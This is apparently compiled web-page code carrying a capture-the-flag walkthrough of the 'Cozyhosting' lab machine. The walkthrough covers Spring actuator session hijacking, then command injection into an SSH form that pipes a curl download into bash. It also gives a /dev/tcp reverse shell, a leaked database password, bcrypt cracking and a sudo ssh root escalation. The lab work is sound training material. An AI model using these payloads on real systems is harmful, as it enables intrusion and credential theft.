import{s as ja,n as Tn}from"./scheduler.rijuCTql.js";import{S as qa,i as Ea,g as t,s as o,H as r,h as p,I as c,c as l,j as u,z as k,f as n,k as m,a as e}from"./index.7JfBVtF2.js";function Ua(Ta){let i,_n="Cozyhosting",ms,d,xn="üëª A very simple HTB seasonal.",ds,h,Hn="Reconnaissance",hs,b,Mn="We can run <code>rustscan</code> to enumerate open ports. Here, we return hits for <code>80</code> (<code>http</code>) and <code>22ssh</code>), which is fairly run-of-the-mill for a server hosting some kind of webapp.",bs,v,Ln="HTTP service",vs,f,Cn="A quick look over the HTTP service on port 80, we see it responds with a <code>Whitelabel Error Page</code> when encountering any non-2xx status code.",fs,g,Pn='<img src="/img/cozyhosting_img/whitelabel_error.png" alt="whitelabel_error.png"/>',gs,y,Sn="A quick google search for this indicates that we are being shown a default error page for the <code>Spring Boot</code> framework.",ys,w,zn='<img src="/img/cozyhosting_img/spring.png" alt="spring.png"/>',ws,T,jn='<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators" rel="nofollow">The Spring framework has <code>Actuator</code> endpoints</a> - intended for debugging purposes - though we can gather a lot of useful information (or even vulnerability-dependent code execution) if they are available to us.  The <code>/actuator</code> route tells us that a handful of debugging endpoints are enabled, and we‚Äôre able to access <em>most</em> of them.',Ts,_,qn='<img src="/img/cozyhosting_img/actuator_dir.png" alt="actuator_dir.png"/>',_s,x,En="Enumerating each endpoint meant simply navigating to the URI, looking over the content, and trying to utilize any relevant information in some kind of request. This strategy seems like it was the best route here, as trying to write a script to automate keyword collection or something would likely be far less efficient.",xs,H,Un="We wind up on the <code>/actuator/mappings</code> endpoint (which displays a list of directories), where we notice a route to a ‚Äòsessions‚Äô endpoint - this might display a list of logged in users, for example.",Hs,M,$n='<img src="/img/cozyhosting_img/mappings.png" alt="mappings.png"/>',Ms,L,Rn="Initial access",Ls,C,Fn="On this actuator endpoint, rather than getting *<strong>*just**</strong> usernames, we are given what is likely a session token for a user named <code>kanderson</code>",Cs,P,In='<img src="/img/cozyhosting_img/sessions.png" alt="sess"/>',Ps,S,An="I‚Äôd already replaced my assigned cookie with <code>kanderson</code>‚Äôs in chrome, but you get the idea",Ss,z,Bn="Impersonating <code>kanderson</code>, we can go back to the login page and refresh it to be redirected to the admin dashboard. Here we see an automatic patching tool for an <code>ssh</code> service.",zs,j,On='<img src="/img/cozyhosting_img/admin-panel.png" alt="admin-panel.png"/>',js,q,Nn="Trying to create a direct connection back to our machine throws a timeout error, even with <code>sshd</code> running - maybe on account of a private key mismatch (though it was probably not intended to ever <em>actually</em> function considering it was purpose-built for a CTF), but we can tell from the error URL parameters that the app is running <code>ssh</code> commands directly from a shell:",qs,E,Dn='<img src="/img/cozyhosting_img/ssh-params.png" alt="ssh-params"/>',Es,U,Kn="Strings from a <code>ssh</code> shell error",Us,$,Vn='<img src="/img/cozyhosting_img/redirect-showing-bash.png" alt="redirect"/>',$s,R,Wn="Confirmed by the error output, which contains the entire output of a <code>ssh</code> error",Rs,F,Gn="Execution",Fs,I,Qn="So it would seem that not only are we executing a direct command onto the target system, but the automatic patching tool also doesn‚Äôt escape malicious strings. It <em>does</em> execute our input prepended with <code>ssh</code>, but this is pretty trivial to bypass.",Is,A,Jn="The solution I used here was to write a reverse shell script to a file and serve it over a python <code>http.server</code>. We can then <code>curl</code> its contents from the CMS, and finally pipe to bash to execute it.",As,B,Yn="This was slightly trickier than simply writing this as a URL-safe sequence, as character encoding like <code>%20</code> or <code>+</code> broke our commands upon reaching the shell, but we can use the  shell variable<code>${IFS}</code> to determine input field separation, which yields our desired word separator here.",Bs,O,Os,_a='<code class="language-bash"><span class="token assign-left variable">host</span><span class="token operator">=</span>n<span class="token operator">&amp;</span><span class="token assign-left variable">username</span><span class="token operator">=</span>%3bcurl<span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span><span class="token operator">&lt;</span>http://10.10.14.40:9990/hello.sh<span class="token operator">|</span>/bin/bash%3b<span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span><span class="token operator">></span></code>',Ns,N,Zn="<code>$ cat hello.sh</code>",Ds,D,Ks,xa='<code class="language-bash">/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/10.10.14.40/9999 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code>',Vs,K,Xn="<p>Note that this method could probably be simplified; this is just what wound up working for me in the moment.</p>",Ws,V,sa='<img src="/img/cozyhosting_img/reverse-shell-success.png" alt="reverse-shell-success"/>',Gs,W,na="We can copy the <code>.jar</code> file from the remote machine to ours to browse it‚Äôs filesystem; I assume this is what the HTTP service uses as its designated file system (Spring Boot is a Java-based application), though I‚Äôve never developed web services with Java, though <code>JAR</code>, being a contraction of ‚ÄúJava archive‚Äù, can be extracted with an archive utility into a (partially) readable filesystem - though we aren‚Äôt performing a decompilation, so we won‚Äôt get 100% readable source.",Qs,G,aa="Regardless, we will download and extract the archive:",Js,Q,Ys,Ha=`<code class="language-bash"><span class="token punctuation">(</span>remote<span class="token punctuation">)</span> app@cozyhosting:/app$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
total <span class="token number">58856</span>
drwxr-xr-x  <span class="token number">2</span> root root     <span class="token number">4096</span> Aug <span class="token number">14</span> <span class="token number">14</span>:11 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">19</span> root root     <span class="token number">4096</span> Aug <span class="token number">14</span> <span class="token number">14</span>:11 <span class="token punctuation">..</span>
-rw-r--r--  <span class="token number">1</span> root root <span class="token number">60259688</span> Aug <span class="token number">11</span> 00:45 cloudhosting-0.0.1.jar
<span class="token punctuation">(</span>remote<span class="token punctuation">)</span> app@cozyhosting:/app$
<span class="token punctuation">(</span>local<span class="token punctuation">)</span> pwncat$ download cloudhosting-0.0.1.jar <span class="token builtin class-name">.</span>
cloudhosting-0.0.1.jar <span class="token punctuation">..</span>. <span class="token number">100.0</span>% ‚Ä¢ <span class="token number">60.3</span>/60.3 MB ‚Ä¢ <span class="token number">2.3</span> MB/s ‚Ä¢ <span class="token number">0</span>:00:00<span class="token punctuation">[</span>06:55:08<span class="token punctuation">]</span> downloaded <span class="token number">60</span>.26MiB <span class="token keyword">in</span> <span class="token number">27.64</span> seconds</code>`,Zs,J,ea="Going through them by hand, the files within are <em>mostly</em> readable as is - enough to see Postgres credentials in the <code>application.properties</code> file, at least:",Xs,Y,sn,Ma=`<code class="language-toml"><span class="token key property">server.address</span><span class="token punctuation">=</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span>
<span class="token key property">server.servlet.session.timeout</span><span class="token punctuation">=</span>5m
<span class="token key property">management.endpoints.web.exposure.include</span><span class="token punctuation">=</span>health<span class="token punctuation">,</span>beans<span class="token punctuation">,</span>env<span class="token punctuation">,</span>sessions<span class="token punctuation">,</span>mappings
<span class="token key property">management.endpoint.sessions.enabled</span><span class="token punctuation">=</span><span class="token boolean">true</span>
<span class="token key property">spring.datasource.driver-class-name</span><span class="token punctuation">=</span>org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>Driver
<span class="token key property">spring.jpa.database-platform</span><span class="token punctuation">=</span>org<span class="token punctuation">.</span>hibernate<span class="token punctuation">.</span>dialect<span class="token punctuation">.</span>PostgreSQLDialect
<span class="token key property">spring.jpa.hibernate.ddl-auto</span><span class="token punctuation">=</span>none
<span class="token key property">spring.jpa.database</span><span class="token punctuation">=</span>POSTGRESQL
<span class="token key property">spring.datasource.platform</span><span class="token punctuation">=</span>postgres
<span class="token key property">spring.datasource.url</span><span class="token punctuation">=</span>jdbc:postgresql://localhost:<span class="token number">5432</span>/cozyhosting
<span class="token key property">spring.datasource.username</span><span class="token punctuation">=</span>postgres
<span class="token key property">spring.datasource.password</span><span class="token punctuation">=</span>Vg&amp;nvzAQ7XxR
</code>`,nn,Z,ta="Privilege escalation",an,X,pa="Going back to our <code>ssh</code> session, we can connection to the Postgresql database to see what might be available to us. I‚Äôve never used Postgres like this before, so it was a little cursed, but I ultimately got there:",en,ss,oa="<code>$ (remote) app@cozyhosting:/app$ psql -h localhost -U postgres</code>",tn,ns,pn,La=`<code class="language-sql">postgres<span class="token operator">=</span><span class="token comment"># \\\\list</span>
                                   List <span class="token keyword">of</span> <span class="token keyword">databases</span>
    Name     <span class="token operator">|</span>  Owner   <span class="token operator">|</span> Encoding <span class="token operator">|</span>   <span class="token keyword">Collate</span>   <span class="token operator">|</span>    Ctype    <span class="token operator">|</span>   Access <span class="token keyword">privileges</span>
<span class="token comment">-------------+----------+----------+-------------+-------------+-----------------------</span>
 cozyhosting <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span>
 postgres    <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span>
 template0   <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> <span class="token operator">=</span>c<span class="token operator">/</span>postgres          <span class="token operator">+</span>
             <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>             <span class="token operator">|</span>             <span class="token operator">|</span> postgres<span class="token operator">=</span>CTc<span class="token operator">/</span>postgres
 template1   <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> <span class="token operator">=</span>c<span class="token operator">/</span>postgres          <span class="token operator">+</span>
             <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>             <span class="token operator">|</span>             <span class="token operator">|</span> postgres<span class="token operator">=</span>CTc<span class="token operator">/</span>postgres
<span class="token punctuation">(</span><span class="token number">4</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>

postgres<span class="token operator">=</span><span class="token comment"># \\\\c cozyhosting</span>
SSL connection <span class="token punctuation">(</span>protocol: TLSv1<span class="token punctuation">.</span><span class="token number">3</span><span class="token punctuation">,</span> cipher: TLS_AES_256_GCM_SHA384<span class="token punctuation">,</span> bits: <span class="token number">256</span><span class="token punctuation">,</span> compression: <span class="token keyword">off</span><span class="token punctuation">)</span>
You are now connected <span class="token keyword">to</span> <span class="token keyword">database</span> <span class="token string">"cozyhosting"</span> <span class="token keyword">as</span> <span class="token keyword">user</span> <span class="token string">"postgres"</span><span class="token punctuation">.</span>
cozyhosting<span class="token operator">=</span><span class="token comment"># \\\\d</span>
              List <span class="token keyword">of</span> relations
 <span class="token keyword">Schema</span> <span class="token operator">|</span>     Name     <span class="token operator">|</span>   <span class="token keyword">Type</span>   <span class="token operator">|</span>  Owner
<span class="token comment">--------+--------------+----------+----------</span>
 <span class="token keyword">public</span> <span class="token operator">|</span> hosts        <span class="token operator">|</span> <span class="token keyword">table</span>    <span class="token operator">|</span> postgres
 <span class="token keyword">public</span> <span class="token operator">|</span> hosts_id_seq <span class="token operator">|</span> sequence <span class="token operator">|</span> postgres
 <span class="token keyword">public</span> <span class="token operator">|</span> users        <span class="token operator">|</span> <span class="token keyword">table</span>    <span class="token operator">|</span> postgres
<span class="token punctuation">(</span><span class="token number">3</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>

cozyhosting<span class="token operator">=</span><span class="token comment"># SELECT password FROM users;</span>
                           password
<span class="token comment">--------------------------------------------------------------</span>
 $<span class="token number">2</span>a$<span class="token number">10</span>$E<span class="token operator">/</span>Vcd9ecflmPudWeLSEIv<span class="token punctuation">.</span>cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
 $<span class="token number">2</span>a$<span class="token number">10</span>$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
<span class="token punctuation">(</span><span class="token number">2</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>

cozyhosting<span class="token operator">=</span><span class="token comment"># SELECT name FROM users;</span>
   name
<span class="token comment">-----------</span>
 kanderson
 admin
<span class="token punctuation">(</span><span class="token number">2</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
</code>`,on,as,la="That looks like a <code>bcrypt</code> hash, so I will run it through <code>hashcat</code> against <code>rockyou</code>.",ln,es,cn,Ca=`<code class="language-bash">$ hashcat <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">3200</span>  <span class="token punctuation">..</span>/bcrypt-cozy.txt <span class="token punctuation">..</span>/rockyou.txt

<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>

Host memory required <span class="token keyword">for</span> this attack: <span class="token number">49</span> MB

Dictionary cache built:
* Filename<span class="token punctuation">..</span>: <span class="token punctuation">..</span>/rockyou.txt
* Passwords.: <span class="token number">14344394</span>
* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139922213</span>
* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344387</span>
* Runtime<span class="token punctuation">..</span>.: <span class="token number">0</span> secs

<span class="token variable">$2a</span><span class="token variable">$10</span><span class="token variable">$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</span>:manchesterunited

Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">3200</span> <span class="token punctuation">(</span>bcrypt <span class="token variable">$2</span>*$, Blowfish <span class="token punctuation">(</span>Unix<span class="token punctuation">))</span>
Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token variable">$2a</span><span class="token variable">$10</span><span class="token variable">$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib</span><span class="token punctuation">..</span>.kVO8dm
Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Tue Sep 05 07:20:52 <span class="token number">2023</span> <span class="token punctuation">(</span><span class="token number">5</span> secs<span class="token punctuation">)</span>
Time.Estimated<span class="token punctuation">..</span>.: Tue Sep 05 07:20:57 <span class="token number">2023</span> <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span><span class="token punctuation">..</span>/rockyou.txt<span class="token punctuation">)</span>
Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
Speed.<span class="token comment">#1.........:      504 H/s (5.31ms) @ Accel:2 Loops:8 Thr:12 Vec:1</span>
Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">2880</span>/14344387 <span class="token punctuation">(</span><span class="token number">0.02</span>%<span class="token punctuation">)</span>
Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/2880 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">2520</span>/14344387 <span class="token punctuation">(</span><span class="token number">0.02</span>%<span class="token punctuation">)</span>
Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024</span>
Candidate.Engine.: Device Generator
Candidates.<span class="token comment">#1....: biscuit -> soccer9</span>
Hardware.Mon.<span class="token comment">#1..: Temp: 51c Fan: 19% Util: 97% Core:1923MHz Mem:4006MHz Bus:16</span>

Started: Tue Sep 05 07:20:44 <span class="token number">2023</span>
Stopped: Tue Sep 05 07:20:59 <span class="token number">2023</span>
</code>`,rn,ts,ca="So our gathered credentials from the database are <code>admin</code>:<code>manchesterunited</code> .",un,ps,ia="<code>user.txt</code>",kn,os,ra="I didn‚Äôt include a screenshot/terminal output of this, but checking other <code>ssh</code> users with <code>$ cat /etc/passwd</code> shows <code>josh</code> as the second user, so we can infer that the <code>admin</code> user is probably .",mn,ls,dn,Pa=`<code class="language-bash"><span class="token assign-left variable">cozyhosting</span><span class="token operator">=</span><span class="token comment"># exit</span>
could not save <span class="token function">history</span> to <span class="token function">file</span> <span class="token string">"/home/app/.psql_history"</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory
<span class="token punctuation">(</span>remote<span class="token punctuation">)</span> app@cozyhosting:/app$ <span class="token function">su</span> josh
Password:
josh@cozyhosting:/app$ <span class="token builtin class-name">cd</span> ~
josh@cozyhosting:~$ <span class="token function">ls</span>
user.txt
josh@cozyhosting:~$ <span class="token function">cat</span> user.txt
7d21d6bcbd68d25a92908bf5290b1a69</code>`,hn,cs,ua="<code>root.txt</code>",bn,is,ka="Finally, lets see what privilege escalation options might be available to us before enumerating with <code>linpeas.sh</code>:",vn,rs,fn,Sa=`<code class="language-bash"><span class="token punctuation">(</span>remote<span class="token punctuation">)</span> josh@cozyhosting:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> josh:
Matching Defaults entries <span class="token keyword">for</span> josh on localhost:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/usr/local/bin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/usr/sbin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/usr/bin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/sbin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/bin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> /usr/bin/ssh *
</code>`,gn,us,ma="As we can run the <code>ssh</code> binary as <code>root</code> with sudo, we can use a pretty simple payload from <code>gtfobins</code> to grab our final flag.",yn,ks,wn,za=`<code class="language-bash"><span class="token punctuation">(</span>remote<span class="token punctuation">)</span> josh@cozyhosting:/tmp$ <span class="token function">sudo</span> <span class="token function">ssh</span> <span class="token parameter variable">-o</span> <span class="token assign-left variable">ProxyCommand</span><span class="token operator">=</span><span class="token string">';sh 0&lt;&amp;2 1>&amp;2'</span> x
<span class="token comment"># whoami</span>
root
<span class="token comment"># cat /root/root.txt</span>
<span class="token number">0</span>******************************6
<span class="token comment">#</span>
</code>`;return{c(){i=t("h1"),i.textContent=_n,ms=o(),d=t("aside"),d.textContent=xn,ds=o(),h=t("h2"),h.textContent=Hn,hs=o(),b=t("p"),b.innerHTML=Mn,bs=o(),v=t("h3"),v.textContent=Ln,vs=o(),f=t("p"),f.innerHTML=Cn,fs=o(),g=t("p"),g.innerHTML=Pn,gs=o(),y=t("p"),y.innerHTML=Sn,ys=o(),w=t("p"),w.innerHTML=zn,ws=o(),T=t("p"),T.innerHTML=jn,Ts=o(),_=t("p"),_.innerHTML=qn,_s=o(),x=t("p"),x.textContent=En,xs=o(),H=t("p"),H.innerHTML=Un,Hs=o(),M=t("p"),M.innerHTML=$n,Ms=o(),L=t("h2"),L.textContent=Rn,Ls=o(),C=t("p"),C.innerHTML=Fn,Cs=o(),P=t("p"),P.innerHTML=In,Ps=o(),S=t("p"),S.innerHTML=An,Ss=o(),z=t("p"),z.innerHTML=Bn,zs=o(),j=t("p"),j.innerHTML=On,js=o(),q=t("p"),q.innerHTML=Nn,qs=o(),E=t("p"),E.innerHTML=Dn,Es=o(),U=t("p"),U.innerHTML=Kn,Us=o(),$=t("p"),$.innerHTML=Vn,$s=o(),R=t("p"),R.innerHTML=Wn,Rs=o(),F=t("h2"),F.textContent=Gn,Fs=o(),I=t("p"),I.innerHTML=Qn,Is=o(),A=t("p"),A.innerHTML=Jn,As=o(),B=t("p"),B.innerHTML=Yn,Bs=o(),O=t("pre"),Os=new r(!1),Ns=o(),N=t("p"),N.innerHTML=Zn,Ds=o(),D=t("pre"),Ks=new r(!1),Vs=o(),K=t("blockquote"),K.innerHTML=Xn,Ws=o(),V=t("p"),V.innerHTML=sa,Gs=o(),W=t("p"),W.innerHTML=na,Qs=o(),G=t("p"),G.textContent=aa,Js=o(),Q=t("pre"),Ys=new r(!1),Zs=o(),J=t("p"),J.innerHTML=ea,Xs=o(),Y=t("pre"),sn=new r(!1),nn=o(),Z=t("h2"),Z.textContent=ta,an=o(),X=t("p"),X.innerHTML=pa,en=o(),ss=t("p"),ss.innerHTML=oa,tn=o(),ns=t("pre"),pn=new r(!1),on=o(),as=t("p"),as.innerHTML=la,ln=o(),es=t("pre"),cn=new r(!1),rn=o(),ts=t("p"),ts.innerHTML=ca,un=o(),ps=t("h3"),ps.innerHTML=ia,kn=o(),os=t("p"),os.innerHTML=ra,mn=o(),ls=t("pre"),dn=new r(!1),hn=o(),cs=t("h3"),cs.innerHTML=ua,bn=o(),is=t("p"),is.innerHTML=ka,vn=o(),rs=t("pre"),fn=new r(!1),gn=o(),us=t("p"),us.innerHTML=ma,yn=o(),ks=t("pre"),wn=new r(!1),this.h()},l(s){i=p(s,"H1",{"data-svelte-h":!0}),c(i)!=="svelte-5wb6mz"&&(i.textContent=_n),ms=l(s),d=p(s,"ASIDE",{"data-svelte-h":!0}),c(d)!=="svelte-zmxn8p"&&(d.textContent=xn),ds=l(s),h=p(s,"H2",{"data-svelte-h":!0}),c(h)!=="svelte-12cw1wm"&&(h.textContent=Hn),hs=l(s),b=p(s,"P",{"data-svelte-h":!0}),c(b)!=="svelte-qf3jqm"&&(b.innerHTML=Mn),bs=l(s),v=p(s,"H3",{"data-svelte-h":!0}),c(v)!=="svelte-1fvxgg3"&&(v.textContent=Ln),vs=l(s),f=p(s,"P",{"data-svelte-h":!0}),c(f)!=="svelte-19tm8j"&&(f.innerHTML=Cn),fs=l(s),g=p(s,"P",{"data-svelte-h":!0}),c(g)!=="svelte-1pg4q3f"&&(g.innerHTML=Pn),gs=l(s),y=p(s,"P",{"data-svelte-h":!0}),c(y)!=="svelte-qnvfbc"&&(y.innerHTML=Sn),ys=l(s),w=p(s,"P",{"data-svelte-h":!0}),c(w)!=="svelte-9k151d"&&(w.innerHTML=zn),ws=l(s),T=p(s,"P",{"data-svelte-h":!0}),c(T)!=="svelte-1k008wl"&&(T.innerHTML=jn),Ts=l(s),_=p(s,"P",{"data-svelte-h":!0}),c(_)!=="svelte-1cb7lh9"&&(_.innerHTML=qn),_s=l(s),x=p(s,"P",{"data-svelte-h":!0}),c(x)!=="svelte-1in4kss"&&(x.textContent=En),xs=l(s),H=p(s,"P",{"data-svelte-h":!0}),c(H)!=="svelte-10m29jz"&&(H.innerHTML=Un),Hs=l(s),M=p(s,"P",{"data-svelte-h":!0}),c(M)!=="svelte-7ogjad"&&(M.innerHTML=$n),Ms=l(s),L=p(s,"H2",{"data-svelte-h":!0}),c(L)!=="svelte-1ig9bwk"&&(L.textContent=Rn),Ls=l(s),C=p(s,"P",{"data-svelte-h":!0}),c(C)!=="svelte-12tgpjd"&&(C.innerHTML=Fn),Cs=l(s),P=p(s,"P",{"data-svelte-h":!0}),c(P)!=="svelte-7agjjv"&&(P.innerHTML=In),Ps=l(s),S=p(s,"P",{"data-svelte-h":!0}),c(S)!=="svelte-1v3hmrt"&&(S.innerHTML=An),Ss=l(s),z=p(s,"P",{"data-svelte-h":!0}),c(z)!=="svelte-1t4zujf"&&(z.innerHTML=Bn),zs=l(s),j=p(s,"P",{"data-svelte-h":!0}),c(j)!=="svelte-djgclt"&&(j.innerHTML=On),js=l(s),q=p(s,"P",{"data-svelte-h":!0}),c(q)!=="svelte-12b8xjm"&&(q.innerHTML=Nn),qs=l(s),E=p(s,"P",{"data-svelte-h":!0}),c(E)!=="svelte-z7tfu6"&&(E.innerHTML=Dn),Es=l(s),U=p(s,"P",{"data-svelte-h":!0}),c(U)!=="svelte-x0ba6e"&&(U.innerHTML=Kn),Us=l(s),$=p(s,"P",{"data-svelte-h":!0}),c($)!=="svelte-yzvlfb"&&($.innerHTML=Vn),$s=l(s),R=p(s,"P",{"data-svelte-h":!0}),c(R)!=="svelte-nf1orm"&&(R.innerHTML=Wn),Rs=l(s),F=p(s,"H2",{"data-svelte-h":!0}),c(F)!=="svelte-1ypel6s"&&(F.textContent=Gn),Fs=l(s),I=p(s,"P",{"data-svelte-h":!0}),c(I)!=="svelte-16p9fh4"&&(I.innerHTML=Qn),Is=l(s),A=p(s,"P",{"data-svelte-h":!0}),c(A)!=="svelte-wvg04p"&&(A.innerHTML=Jn),As=l(s),B=p(s,"P",{"data-svelte-h":!0}),c(B)!=="svelte-14s9rm5"&&(B.innerHTML=Yn),Bs=l(s),O=p(s,"PRE",{class:!0});var a=u(O);Os=k(a,!1),a.forEach(n),Ns=l(s),N=p(s,"P",{"data-svelte-h":!0}),c(N)!=="svelte-1c20q22"&&(N.innerHTML=Zn),Ds=l(s),D=p(s,"PRE",{class:!0});var da=u(D);Ks=k(da,!1),da.forEach(n),Vs=l(s),K=p(s,"BLOCKQUOTE",{"data-svelte-h":!0}),c(K)!=="svelte-rqcm09"&&(K.innerHTML=Xn),Ws=l(s),V=p(s,"P",{"data-svelte-h":!0}),c(V)!=="svelte-1qnayw0"&&(V.innerHTML=sa),Gs=l(s),W=p(s,"P",{"data-svelte-h":!0}),c(W)!=="svelte-10rcktw"&&(W.innerHTML=na),Qs=l(s),G=p(s,"P",{"data-svelte-h":!0}),c(G)!=="svelte-4eozmr"&&(G.textContent=aa),Js=l(s),Q=p(s,"PRE",{class:!0});var ha=u(Q);Ys=k(ha,!1),ha.forEach(n),Zs=l(s),J=p(s,"P",{"data-svelte-h":!0}),c(J)!=="svelte-1qrel61"&&(J.innerHTML=ea),Xs=l(s),Y=p(s,"PRE",{class:!0});var ba=u(Y);sn=k(ba,!1),ba.forEach(n),nn=l(s),Z=p(s,"H2",{"data-svelte-h":!0}),c(Z)!=="svelte-12ouyou"&&(Z.textContent=ta),an=l(s),X=p(s,"P",{"data-svelte-h":!0}),c(X)!=="svelte-nbz4js"&&(X.innerHTML=pa),en=l(s),ss=p(s,"P",{"data-svelte-h":!0}),c(ss)!=="svelte-dy1k4f"&&(ss.innerHTML=oa),tn=l(s),ns=p(s,"PRE",{class:!0});var va=u(ns);pn=k(va,!1),va.forEach(n),on=l(s),as=p(s,"P",{"data-svelte-h":!0}),c(as)!=="svelte-7aznp1"&&(as.innerHTML=la),ln=l(s),es=p(s,"PRE",{class:!0});var fa=u(es);cn=k(fa,!1),fa.forEach(n),rn=l(s),ts=p(s,"P",{"data-svelte-h":!0}),c(ts)!=="svelte-tx3vfy"&&(ts.innerHTML=ca),un=l(s),ps=p(s,"H3",{"data-svelte-h":!0}),c(ps)!=="svelte-6ag4bk"&&(ps.innerHTML=ia),kn=l(s),os=p(s,"P",{"data-svelte-h":!0}),c(os)!=="svelte-14xqi2l"&&(os.innerHTML=ra),mn=l(s),ls=p(s,"PRE",{class:!0});var ga=u(ls);dn=k(ga,!1),ga.forEach(n),hn=l(s),cs=p(s,"H3",{"data-svelte-h":!0}),c(cs)!=="svelte-17s0qqz"&&(cs.innerHTML=ua),bn=l(s),is=p(s,"P",{"data-svelte-h":!0}),c(is)!=="svelte-192atu4"&&(is.innerHTML=ka),vn=l(s),rs=p(s,"PRE",{class:!0});var ya=u(rs);fn=k(ya,!1),ya.forEach(n),gn=l(s),us=p(s,"P",{"data-svelte-h":!0}),c(us)!=="svelte-wkyob8"&&(us.innerHTML=ma),yn=l(s),ks=p(s,"PRE",{class:!0});var 